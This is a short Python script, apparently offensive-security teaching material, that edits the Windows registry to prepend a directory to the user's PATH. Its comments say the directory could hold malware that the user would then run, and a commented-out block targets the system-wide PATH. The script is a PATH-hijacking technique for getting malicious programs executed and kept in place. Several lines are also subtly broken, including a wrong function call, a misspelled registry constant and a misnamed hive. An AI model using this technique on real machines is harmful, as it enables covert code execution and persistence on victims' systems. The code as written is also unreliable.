# We designed that to read the PATH value and edit it for the 
# different locations.
# We are going to try to redirect that PATH to the current working directory
# We could easily replace this with a location where weve got
# some malware installed on the system that we want to have run.

import os, winreg

def readPathValue(reghive, regpath):
    reg = winreg.ConnectRegistry(None,reghive)
    key = winreg.OpenKey(reg,regpath,access=winreg.KEY_READ)
    index = 0
    while True:
        val = winreg.EnumValue(key.index)
        if val[0] == "Path":
            return val [1]
        index += 1

def editPathValue(reghive,regpath,targetdir) :
    path = readPathValue(reghive,regpath)
    newpath = targetdir + ";" + path
    reg = winreg.ConnectRegistry(None,reghive)
    key = winreg.OpenKey(reg,regpath,access=winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key,"path",0,winreg.REG_EXPAND_SE,newpath)

# Modify user path
reghive = winreg.KEY_CURRENT_USER
regpath = "Environment"
targetdir = os.getcwd()

editPathValue(reghive,regpath,targetdir)






# Modify System path
# reghive = winreg.HKEY_LOCAL_MACHINE
# regpath = "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
# editPathValue(reghive,regpath,targetdir) 